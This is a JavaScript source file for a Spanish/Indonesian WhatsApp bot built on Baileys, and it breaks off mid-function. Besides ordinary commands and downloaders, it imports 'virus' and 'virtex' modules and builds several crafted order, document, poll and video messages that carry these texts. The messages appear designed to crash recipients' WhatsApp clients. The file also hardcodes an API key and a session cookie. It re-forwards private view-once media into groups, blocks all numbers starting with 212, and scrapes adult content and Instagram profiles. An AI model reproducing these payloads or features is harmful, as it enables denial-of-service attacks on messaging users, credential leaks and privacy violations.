require('./settings')
require('./lib/funclist')
require('./lib/listmenu')
const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { clockString, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/list')
const { buttonvirus } = require('./scrape/buttonvirus')
const { buttonvirus2 } = require('./scrape/buttonvirus2')
const { ngazap } = require('./scrape/ngazap')
const { virtex } = require('./scrape/virtex')
const { virus } = require('./scrape/virus')
const { philips } = require('./scrape/philips')
const { santedpc } = require('./lib/santedpc')
const { santedgc } = require('./lib/santedgc')
const { antiSpam } = require('./lib/antispam')
const { color, bgcolor } = require('./lib/color')
const { jadibot, conns } = require('./jadibot')
const { uptotelegra } = require('./scrape/upload')
const { dafontSearch, dafontDown } = require('./scrape/dafont')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess')
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const ffstalk = require('./scrape/ffstalk')
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const mlstalk = require('./scrape/mlstalk')
const textpro = require('./scrape/textpro')
const photooxy = require('./scrape/photooxy')
const yts = require('./scrape/yt-search')
const kirleys = require('@adiwajshing/baileys')
const vm = require('node:vm')
const audionye = fs.readFileSync('./y.mp3')
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const pandaaudio = JSON.parse(fs.readFileSync('./Audios-Top/audio.json'));
const db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'))
const pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const dblist = JSON.parse(fs.readFileSync('./database/listall.json'))

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

module.exports = Panda = async (Panda, m, chatUpdate, store) => {
try {
        const gakbisaowner = `${ownerNomor}@s.whatsapp.net`
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const content = JSON.stringify(m.message)
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await Panda.decodeJid(Panda.user.id)
        const itsMePanda = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const Horas = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const tahunBaru = new Date('January 1, 2023 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = tahunBaru - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jminutos = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const idulFitri = new Date('December 22, 2022 00:00:00')
        const ayeuna = new Date().getTime()
        const ceIroh = idulFitri - ayeuna
        const hahari = Math.floor( ceIroh / (1000 * 60 * 60 * 24));
        const hajam = Math.floor( ceIroh % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const hamenit = Math.floor( ceIroh % (1000 * 60 * 60) / (1000 * 60))
        const hadetik = Math.floor( ceIroh % (1000 * 60) / 1000)
        const idulAdha = new Date('December 25, 2022 00:00:00')
        const nembe = new Date().getTime()
        const ceDadah = idulAdha - nembe
        const hihari = Math.floor( ceDadah / (1000 * 60 * 60 * 24));
        const hijam = Math.floor( ceDadah % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const himenit = Math.floor( ceDadah % (1000 * 60 * 60) / (1000 * 60))
        const hidetik = Math.floor( ceDadah % (1000 * 60) / 1000)
        const UltahCreator = new Date('August 14, 2023 00:00:00')
        const CreatorPanda = new Date().getTime()
        const PandaBotWA = UltahCreator - CreatorPanda
        const kayhari = Math.floor( PandaBotWA / (1000 * 60 * 60 * 24));
        const kayjam = Math.floor( PandaBotWA % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const kaymenit = Math.floor( PandaBotWA % (1000 * 60 * 60) / (1000 * 60))
        const kaydetik = Math.floor( PandaBotWA % (1000 * 60) / 1000)
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await Panda.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPrem = prem.includes(sender)
    	const isUser = pendaftar.includes(sender)
    	const banUser = await Panda.fetchBlocklist()
        const isBanned = banUser ? banUser.includes(m.sender) : false
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
}
} catch (err) {
console.error(err)
}

if (!Panda.public) {
if (!m.key.fromMe) return
}

var mdu = ['red','green','yellow','blue','magenta','cyan','white']
var halalu = mdu[Math.floor(Math.random() * mdu.length)]
var mdo = ['red','green','yellow','blue','magenta','cyan','white']
var halalo = mdo[Math.floor(Math.random() * mdo.length)]
var mdi = ['red','green','yellow','blue','magenta','cyan','white']
var halali = mdi[Math.floor(Math.random() * mdi.length)]
var mda = ['red','green','yellow','blue','magenta','cyan','white']
var halala = mda[Math.floor(Math.random() * mda.length)]
var mde = ['red','green','yellow','blue','magenta','cyan','white']
var halale = mde[Math.floor(Math.random() * mde.length)]

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(' - Black Panda '), color(`[ Mensaje ]`, `${halalu}`), color(`FROM`, `${halalo}`), color(`${pushname}`, `${halali}`), color(`Texto :`, `${halala}`), color(`${body}`, `${halale}`))
}

if (isCmd && !isUser) {
pendaftar.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
}

if (isCmd && antiSpam.isFiltered(from) && !m.isGroup) {
console.log(color('[SPAM]', 'red'), color(wib, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
return m.reply('「 ❗ 」Esto no es un comando')
}
        
if (isCmd && antiSpam.isFiltered(from) && m.isGroup) {
console.log(color('[SPAM]', 'red'), color(wib, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
return m.reply('「 ❗ 」Esto no es un comando')
}

if (isCmd && !itsMePanda) antiSpam.addFilter(from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`No lo etiquetes!\nes el afk ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}\ndurante ${clockString(new Date - afkTime)}`.trim())
}

if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`\nNo lo etiquetes${user.afkReason ? ' depues ' + user.afkReason : ''}\ndurante ${clockString(new Date - user.afkTime)} `.trim())
user.afkTime = -1
user.afkReason = ''
}

if (m.sender.startsWith('212')) return Panda.updateBlockStatus(m.sender, 'block')

async function sendPandaMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await Panda.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

const sendSticker = (pesan) => {
Panda.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
}

try {
ppuser = await Panda.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await reSize(ppuser, 300, 300)

const sendvn = (teks) => {
Panda.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}

for (let anju of vnnye) {
if (budy === anju) {
let buffer = fs.readFileSync(`./database/Audio/${anju}.mp3`)
sendvn(buffer)
}
}

for (let anju of pandaaudio){
				if (budy === anju){
					result = fs.readFileSync(`./Assets/audio/${anju}.mp3`)
					Panda.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
					}
			}

if (m.isGroup && m.mtype == 'viewOnceMessage') {
let teks = `╭「 *Anti ViewOnce* 」\n├ *Name* : ${pushname}\n├ *Usuario* : @${m.sender.split("@")[0]}\n├ *Hora* : ${wib} WIB\n└ Mensaje* : ${m.mtype}`
Panda.sendMessage(m.chat, { text: teks, mentions: [m.sender] }, { quoted: m })
await sleep(500)
m.copyNForward(m.chat, true, {readViewOnce: true}, {quoted: m}).catch(_ => m.reply('El mensaje fue abierto por el bot'))
}

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `Panda Bot WhatsApp`, 
"jpegThumbnail": ppnyauser
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: '56921700706@s.whatsapp.net' } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: ppnyauser } } }

const troli = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
message: {
orderMessage: {
itemCount : 999999999999999999,
status: 99999999999999999999,
surface : 9999999999999999,
message: virus,
orderTitle: virus,
thumbnail: ppnyauser,
sellerJid: '0@s.whatsapp.net'
},
},
};

const reply = (teks) => {
Panda.sendMessage(from, { text: teks ,
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}
}, { quoted : repPy })
}

const banRep = () => {
Panda.sendMessage(m.chat, {
text:`Usted ha sido baneado contactar al @${creator.split("@")[0]} Tal vez el te pueda ayudar`,
mentions: [creator],
},
{
quoted:m
})
}

if (isCmd && isBanned) {
return banRep()
}

const crsh = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `Panda Bot WhatsApp${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

let list = []
for (let i of owner) {
list.push({
displayName: await Panda.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await Panda.getName(i + '@s.whatsapp.net')}\n
FN:${await Panda.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:blackpandamospanama@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://bit.ly/39Iva7s6\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Chile;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

const voll = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
"message": {
"pollCreationMessage": {
"name": `Black Panda Bot ${virus}${virtex(prefix)}`,
"options": [
	{
"optionName": "KATANYA WA KEBAL"
	},
	{
"optionName": "BERANI VOTE GA"
	},
	{
"optionName": "VOTE LAH SEMUA"
	},
	{
"optionName": "KATANYA KEBAL"
	},
	{
"optionName": "SALAM DARI Panda BOT"
	}
],
"selectableOptionsCount": 5
}}}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: 'Panda Bot',
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: 'Creator Panda'
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "USD"
			}
		}
	}
}

const gifes = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
"message": { 
"videoMessage": { 
"title": `${virtex(prefix)}`,
"h": `${virus}`,
'duration': '99999', 
'gifPlayback': 'true', 
'caption': `${virus}${virtex(prefix)}`,
'jpegThumbnail': ppnyauser
}}}

const vien = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"orderMessage": {
"orderId": "594071395007984",
"thumbnail": ppnyauser,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `Panda Bot WhatsApp${ngazap(prefix)}`,
"orderTitle": "Panda Bot WhatsApp${ngazap(prefix)}",
"sellerJid": "56921700706@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR"
}}}

let rn = ['recording','composing']
let jd = rn[Math.floor(Math.random() * rn.length)];

if (command) {
Panda.sendPresenceUpdate(jd, from)
Panda.readMessages([m.key])
}

function simpan(path, buff) {
    fs.writeFileSync(path, buff)
    return path
}
function getRandom(ext) {
    ext = ext || ""
    return `${Math.floor(Math.random() * 100000)}.${ext}`
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Descarga mediante ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await Panda.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Descarga mediante ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await Panda.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

async function sendPoll(jid, text, list) {
Panda.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function bygbt(text) {
Panda.sendMessage(text, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}

const botzPanda = "56921700706@s.whatsapp.net"
const mark = "0@s.whatsapp.net"
const timestamp = speed()
const latensi = speed() - timestamp
const butlocNye = [
{buttonId: `${prefix}owner`, buttonText: {displayText: '𝑪𝑹𝑬𝑨𝑫𝑶𝑹'}, type: 1},
{buttonId: `${prefix}sewabot`, buttonText: {displayText: '𝐒𝐄𝐖𝐀𝐁𝐎𝐓'}, type: 1}
]
const buttonLocnya = {
location: { jpegThumbnail: ppnyauser } ,
caption: `Hola@${sender.split("@")[0]}\nYo soy tu assistente bot personal estare para 24/7 para ayudarte a travez de mis comando con lo que desees\nNombre : ${pushname}\n Numero ${itsMePanda ? 'Owner' : 'User'} : ${sender.split("@")[0]}\nEstado Rol : ${itsMePanda ? 'Owner' : 'User'}\nEstado Prem : ${isPrem ? 'Premium User' : 'Free User'}\nConectado desde : ${runtime(process.uptime())}\nVelocidad : ${latensi.toFixed(4)} segundos\nAño nuevo : ${jhari} dias ${jjam} Horas${jmenit} Minutos ${jdetik} Segundos\n\nNoche buena : ${hahari} dias ${hajam} horas ${hamenit} minutos${hadetik} segundos\n\nNavidad : ${hihari} dias ${hijam} horas ${himenit} minutos ${hidetik} segundos\n Cumpleaños del creador : ${kayhari} dias ${kayjam} horas ${kaymenit} minutos ${kaydetik} segundos\n\nMi Grupo : https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB\n\n\n𝐁𝐥𝐚𝐜𝐤 𝐏𝐚𝐧𝐝𝐚 𝐁𝐨𝐭 𝐌𝐃 𝟐𝟒/𝟕`,
mentions : [sender, botzPanda, mark],
footer: `Creador @${botzPanda.split("@")[0]}
WhatsApp By @${mark.split("@")[0]}`,
buttons: butlocNye,
headerType: "LOCATION"
}

async function rmbg(buffer) {
let form = new FormData
form.append("size", "auto")
form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
let res = await axios({
  url: "https://api.remove.bg/v1.0/removebg",
  method: "POST",
  data: form,
  responseType: "arraybuffer",
  headers: {
    "X-Api-Key": "24yjkNG4jrXeh1WcMdMJMWD2",
    ...form.getHeaders()
  }
})
return res.data
}

async function getFile(media) {
        let data = Buffer.isBuffer(media) ? media : isUrl(media) ? await ( await fetch(media)).buffer() : fs.existsSync(media) ? fs.readFileSync(media) : /^data:.*?\/.*?;base64,/i.test(media) ? Buffer.from(media.split(",")[1]) : null
        if (!data) return new Error("El resulto no es valido")
        let type = await FileType.fromBuffer(data) || {
          mime: "application/octet-stream",
          ext: ".bin"
        }
        return {
          data,
          ...type
        }
      }

async function sendFile(jid, media, options={}) {
        let file = await getFile(media)
        let mime = file.ext, type
        if (mime == "mp3") {
          type = "audio"
          options.mimetype = "audio/mpeg"
          options.ptt = options.ptt || false
        }
        else if (mime == "jpg" || mime == "jpeg" || mime == "png") type = "image"
        else if (mime == "webp") type = "sticker"
        else if (mime == "mp4") type = "video"
        else type = "document"
        return Panda.sendMessage(jid, { [type]: file.data, ...options }, { ...options })
      }

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function genProfile(Panda, m) {
   let font = await Jimp.loadFont('./name.fnt'), 
     mask = await Jimp.read('https://i.imgur.com/552kzaW.png'), 
     welcome = await Jimp.read("https://telegra.ph/file/81260a8b9e8cff26d2b48.jpg"), 
     avatar = await Jimp.read(await Panda.profilePictureUrl(m.sender, 'image').catch(() => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')), 
     status = (await Panda.fetchStatus(m.sender).catch(console.log) || {}).status?.slice(0, 30) || 'Not Detected' 
     await avatar.resize(460, 460) 
     await mask.resize(460, 460) 
     await avatar.mask(mask) 
     await welcome.resize(welcome.getWidth(), welcome.getHeight()) 
     await welcome.print(font, 550, 180, 'Nombre:') 
     await welcome.print(font, 650, 255, m.pushName.slice(0, 25)) 
     await welcome.print(font, 550, 340, 'Bio:') 
     await welcome.print(font, 650, 415, status) 
     await welcome.print(font, 550, 500, 'Numero:') 
     await welcome.print(font, 650, 575, PhoneNumber('+' + m.sender.split('@')[0]).getNumber('international')) 
     return await welcome.composite(avatar, 50, 170).getBufferAsync('image/png') 
}

async function quotesanime () {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
                hasil.push({
                    link: $(h).find('a').attr('href'),
                    gambar: $(h).find('img').attr('data-src'),
                    karakter: $(h).find('div.char-name').text().trim(),
                    anime: $(h).find('div.anime-title').text().trim(),
                    episode: $(h).find('div.meta').text(),
                    up_at: $(h).find('small.meta').text(),
                    quotes: $(h).find('div.quote').text().trim()
                })
            })
            resolve(hasil)
        }).catch(reject)
    })
}

async function tiktokdl(url) {
    try {
        const tokenn = await axios.get("https://downvideo.quora-wiki.com/tiktok-video-downloader#url=" + url);
        let a = cheerio.load(tokenn.data);
        let token = a("#token").attr("value");
        const param = {
            url: url,
            token: token,
        };
        const { data } = await axios.request("https://downvideo.quora-wiki.com/system/action.php", {
                method: "post",
                data: new URLSearchParams(Object.entries(param)),
                headers: {
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
                    "referer": "https://downvideo.quora-wiki.com/tiktok-video-downloader",
                },
            }
        );
        return {
            status: 200,
            title: data.title,
            thumbnail: "https:" + data.thumbnail,
            duration: data.duration,
            media: data.medias,
        };
    } catch (e) {
        return e
    }
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `Panda`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
                hasil.push({
                    title: $(b).find('header > h2').text(),
                    link: $(b).find('header > h2 > a').attr('href'),
                    category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
                    share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                    views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                    type: $(b).find('source').attr('type') || 'image/jpeg',
                    video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                    video_2: $(b).find('video > a').attr('href') || ''
                })
            })
            resolve(hasil)
        })
    })
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
